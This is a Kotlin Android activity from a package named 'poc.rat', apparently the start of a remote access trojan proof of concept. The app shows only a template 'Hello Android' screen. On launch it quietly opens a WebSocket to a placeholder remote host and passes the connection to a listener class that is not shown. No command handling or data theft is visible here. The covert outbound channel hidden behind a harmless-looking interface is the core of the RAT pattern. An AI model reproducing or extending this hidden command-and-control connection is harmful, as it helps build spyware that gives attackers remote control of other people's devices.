package poc.rat

import android.os.Bundle
import okhttp3.OkHttpClient
import okhttp3.Request
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import poc.rat.ui.theme.MyApplicationTheme
import poc.rat.ui.theme.SimpleWebSocketListener

class MainActivity : ComponentActivity() {
    private lateinit var client: OkHttpClient


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Android",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }

        client = OkHttpClient()

        // Create a request for the WebSocket URL.
        val request = Request.Builder()
            .url("ws://server.com/path") // Use ws:// or wss:// as appropriate
            .build()

        // Create an instance of your listener.
        val listener = SimpleWebSocketListener()

        // Start the WebSocket connection.
        val webSocket = client.newWebSocket(request, listener)

    }

    override fun onDestroy() {
        super.onDestroy()
        // Shut down the OkHttp client to free resources when your Activity is destroyed.
        client.dispatcher.executorService.shutdown()
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    MyApplicationTheme {
        Greeting("Android")
    }
}